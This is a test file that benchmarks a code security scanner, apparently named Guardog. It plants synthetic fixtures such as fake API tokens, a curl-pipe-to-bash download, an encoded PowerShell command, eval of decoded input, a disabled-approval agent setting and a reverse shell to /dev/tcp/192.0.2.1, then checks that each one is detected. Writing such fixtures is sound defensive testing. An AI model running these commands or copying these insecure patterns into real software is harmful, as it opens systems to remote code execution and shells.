// Independently curated, synthetic examples. These are fixture measurements, not production efficacy claims.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const seeds = [
 ['GD-SECRET-GITHUB','secrets','app/config.js', `const token = 'ghp_${'A1'.repeat(18)}';`],
 ['GD-SECRET-AWS','secrets','.env', 'AWS_ACCESS_KEY_ID=AKIA1234567890ABCDEF'],
 ['GD-SECRET-PRIVATE-KEY','secrets','keys/local.pem', '-----BEGIN OPENSSH PRIVATE KEY-----\nSYNTHETIC FIXTURE ONLY\n-----END OPENSSH PRIVATE KEY-----'],
 ['GD-SECRET-SLACK','secrets','app/chat.js', `const bearer = 'xoxb-${'1234567890'.repeat(3)}';`],
 ['GD-SECRET-STRIPE','secrets','payments.js', `const stripe = 'sk_live_${'A1'.repeat(14)}';`],
 ['GD-SECRET-GOOGLE','secrets','mobile/config.json', JSON.stringify({ key: 'AIza' + 'A'.repeat(35) })],
 ['GD-SECRET-NPM','secrets','.npmrc', '//registry.npmjs.org/:_authToken=npm_' + 'a1'.repeat(18)],
 ['GD-SECRET-PYPI','secrets','.pypirc', '[pypi]\nusername = __token__\npassword = pypi-' + 'Ab2_'.repeat(18)],
 ['GD-SECRET-OPENAI','secrets','.env.production', 'OPENAI_API_KEY=sk-proj-' + 'a1_'.repeat(20)],
 ['GD-SECRET-ASSIGNMENT','secrets','config.py', 'client_secret = "F7p9kxQ2mY4vZ6nB8sD0aL"'],
 ['GD-DOWNLOAD-EXEC','source','scripts/setup.sh', 'curl --fail --silent https://example.invalid/bootstrap.sh | bash'],
 ['GD-POWERSHELL-ENCODED','source','scripts/setup.ps1', 'powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoACcAdABlAHMAdAAnACkA'],
 ['GD-ENCODED-EVAL','source','worker.js', 'eval(atob(encodedPayload));'],
 ['GD-JS-REQUEST-EXEC','source','api/execute.ts', 'exec(req.body.command);'],
 ['GD-PYTHON-PICKLE-INPUT','source','server.py', 'value = pickle.loads(request.data)'],
 ['GD-PYTHON-SHELL','source','scripts/runner.py', 'subprocess.run(command, shell=True)'],
 ['GD-TLS-DISABLED','configuration','scripts/dev.sh', 'export NODE_TLS_REJECT_UNAUTHORIZED=0'],
 ['GD-TLS-REJECT-FALSE','configuration','http.js', 'new https.Agent({ rejectUnauthorized: false });'],
 ['GD-NPM-TLS-DISABLED','configuration','.npmrc', 'registry=https://registry.npmjs.org\nstrict-ssl=false\n'],
 ['GD-DOCKER-SOCKET','configuration','docker-compose.yml', 'services:\n  worker:\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock'],
 ['GD-CONTAINER-PRIVILEGED','configuration','deployment.yaml', 'securityContext:\n  privileged: true'],
 ['GD-TERRAFORM-PUBLIC-SSH','configuration','main.tf', 'ingress { from_port = 22\n to_port = 22\n cidr_blocks = ["0.0.0.0/0"]\n}'],
 ['GD-CI-WRITE-ALL','ci','.github/workflows/build.yml', 'name: Build\non: push\npermissions: write-all'],
 ['GD-CI-PRIVILEGED-PR','ci','.github/workflows/pr.yml', 'name: Pull Request\non: pull_request_target'],
 ['GD-CI-UNTRUSTED-EXPRESSION','ci','.github/workflows/title.yml', 'steps:\n  - run: echo "${{ github.event.pull_request.title }}"'],
 ['GD-CI-MUTABLE-ACTION','ci','.github/workflows/build.yml', 'steps:\n  - uses: actions/checkout@v4'],
 ['GD-AGENT-APPROVAL-BYPASS','agent','.codex/config.toml', 'approval_policy = "never"'],
 ['GD-MALWARE-EICAR','malware','sample.bin', Buffer.from('\0EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*','latin1')],
];
const benign = [
 ['download-then-review','source','install.sh','curl --fail https://example.invalid/install.sh -o install.sh\nsha256sum install.sh'],
 ['decode-data-only','source','decode.js','const message = atob(encoded); JSON.parse(message);'],
 ['constant-exec','source','health.js','exec("uptime");'],
 ['argument-array','source','api.ts','execFile("convert", [validatedInput, output]);'],
 ['shell-disabled','source','runner.py','subprocess.run(["echo", message], shell=False)'],
 ['safe-json','source','server.py','value = json.loads(request.data)'],
 ['local-pickle','source','cache.py','value = pickle.loads(cache.read())'],
 ['tls-on','configuration','network.js','new https.Agent({ rejectUnauthorized: true });'],
 ['node-tls-on','configuration','run.sh','export NODE_TLS_REJECT_UNAUTHORIZED=1'],
 ['npm-tls-on','configuration','.npmrc','strict-ssl=true'],
 ['npm-comment','configuration','.npmrc','# strict-ssl=false\nstrict-ssl=true'],
 ['container-unprivileged','configuration','compose.yml','services:\n  worker:\n    privileged: false'],
 ['restricted-ingress','configuration','main.tf','cidr_blocks = ["10.12.0.0/16"]'],
 ['ci-read-only','ci','.github/workflows/read.yml','permissions:\n  contents: read'],
 ['normal-pr','ci','.github/workflows/pr.yml','on: pull_request'],
 ['sha-action','ci','.github/workflows/pinned.yml','steps:\n  - uses: actions/checkout@' + '0123456789abcdef'.repeat(2) + '01234567'],
 ['agent-safe','agent','.codex/config.toml','approval_policy = "on-request"\nsandbox_mode = "workspace-write"'],
 ['public-key','secrets','keys/id.pub','-----BEGIN PUBLIC KEY-----\nSYNTHETIC ONLY\n-----END PUBLIC KEY-----'],
 ['runtime-secret','secrets','auth.js','const token = process.env.GITHUB_TOKEN;'],
 ['short-nonsecret','secrets','config.js','const password = "example";'],
 ['stripe-test-key','secrets','test.js','const key = "sk_test_' + 'a1'.repeat(20) + '";'],
 ['workflow-like-outside-ci','ci','examples/workflow.yaml','permissions: write-all\non: pull_request_target'],
 // Nearby benign contexts deliberately exercise known heuristic limitations.
 ['ci-safe-env-expression','ci','.github/workflows/title.yml','steps:\n  - env:\n      TITLE: ${{ github.event.issue.title }}\n    run: printf "%s\\n" "$TITLE"'],
 ['public-web-ingress','configuration','web.tf','ingress { from_port = 443\n to_port = 443\n cidr_blocks = ["0.0.0.0/0"]\n}'],
 ['commented-socket','configuration','docker-compose.yml','# Never mount /var/run/docker.sock in this service\nservices: {}'],
 ['commented-agent-option','agent','.codex/config.toml','# Do not use approval_policy = "never"\napproval_policy = "on-request"'],
 ['known-placeholder','secrets','example.js','const password = "this_is_a_placeholder_not_a_secret";'],
 ['documented-aws-example','secrets','README.md','AWS documentation example identifier: AKIAIOSFODNN7EXAMPLE'],
];
const variants = [
 ['json-node-tls','GD-TLS-DISABLED','configuration','package.json','{"scripts":{"test":"node app.js"},"env":{"NODE_TLS_REJECT_UNAUTHORIZED":"0"}}'],
 ['quoted-json-agent','GD-AGENT-APPROVAL-BYPASS','agent','.mcp.json','{"approval_policy":"never","sandbox_mode":"danger-full-access"}'],
 ['aliased-execution','GD-JS-REQUEST-EXEC','source','api.js','const command = req.body.command; exec(command);'],
 ['bracket-access','GD-JS-REQUEST-EXEC','source','api.js','exec(req["body"].command);'],
 ['download-newline','GD-DOWNLOAD-EXEC','source','setup.sh','curl https://example.invalid/install.sh \\\n | bash'],
 ['secret-env-assignment','GD-SECRET-ASSIGNMENT','secrets','.env','CLIENT_SECRET="F7p9kxQ2mY4vZ6nB8sD0aL"'],
 ['binary-secret','GD-SECRET-GITHUB','secrets','blob.bin',Buffer.from('\0ghp_'+'A1'.repeat(18))],
 ['reverse-shell','UNSUPPORTED-REVERSE-SHELL','malware','launch.sh','bash -i >& /dev/tcp/192.0.2.1/4444 0>&1'],
];

async function scanFixture(file, content) {
 const dir = fs.mkdtempSync(path.join(os.tmpdir(),'guardog-benchmark-'));
 try {
  const target=path.join(dir,file);fs.mkdirSync(path.dirname(target),{recursive:true});fs.writeFileSync(target,content);
  const {scanWorkspace}=await import('../src/workspace-scan.js');
  return scanWorkspace(dir);
 } finally {fs.rmSync(dir,{recursive:true,force:true});}
}

const metrics={seeded:{},benign:{},variants:[],falsePositiveCases:[]};
test('native benchmark: seeded corpus exercises each documented rule through disk traversal',async t=>{
 const {RULES}=await import('../src/workspace-rules.js');
 assert.deepEqual(seeds.map(s=>s[0]).sort(),RULES.map(r=>r.id).sort(),'benchmark must cover every native rule');
 for(const [rule,category,file,content] of seeds) await t.test(rule,async()=>{
  const report=await scanFixture(file,content);
  const metric=metrics.seeded[category]??={samples:0,detected:0};metric.samples++;
  if(report.findings.some(f=>f.ruleId===rule))metric.detected++;
  assert.equal(report.coverage.complete,true);
  assert.ok(report.findings.some(f=>f.ruleId===rule),`${rule} was missed`);
  for(const finding of report.findings){assert.equal(finding.path,file);assert.match(finding.fingerprint,/^[a-f0-9]{64}$/);}
  if(category==='secrets') {
   const raw=typeof content==='string'?content:String(content);
   const secret=raw.match(/(?:ghp_|npm_|sk_live_|AIza|xoxb-|pypi-|sk-proj-)[A-Za-z0-9_-]+/)?.[0]||raw.match(/F7p9kxQ2mY4vZ6nB8sD0aL|AKIA1234567890ABCDEF/)?.[0];
   if(secret)assert.ok(!JSON.stringify(report).includes(secret),'report leaked planted secret');
  }
 });
});

test('native benchmark: independently labelled benign samples record false positives',async()=>{
 for(const [name,category,file,content] of benign){
  const report=await scanFixture(file,content);
  assert.equal(report.coverage.complete,true);
  const metric=metrics.benign[category]??={samples:0,flaggedSamples:0,findings:0};metric.samples++;
  if(report.findings.length){metric.flaggedSamples++;metric.findings+=report.findings.length;metrics.falsePositiveCases.push({name,rules:[...new Set(report.findings.map(f=>f.ruleId))]});}
  assert.equal(report.findings.length,0,`${name}: ${report.findings.map(f=>f.ruleId).join(', ')}`);
 }
});

test('native benchmark: syntax variants and unsupported behaviors disclose recall boundaries',async()=>{
 for(const [name,rule,category,file,content] of variants){
  const report=await scanFixture(file,content);
  metrics.variants.push({name,category,expectedRule:rule,detected:report.findings.some(f=>f.ruleId===rule),findings:report.findings.map(f=>f.ruleId)});
  if(['json-node-tls','quoted-json-agent','download-newline','secret-env-assignment'].includes(name)) assert.ok(report.findings.some(f=>f.ruleId===rule),`${name} regressed`);
 }
 console.log('GUARDDOG_NATIVE_BENCHMARK '+JSON.stringify(metrics));
});
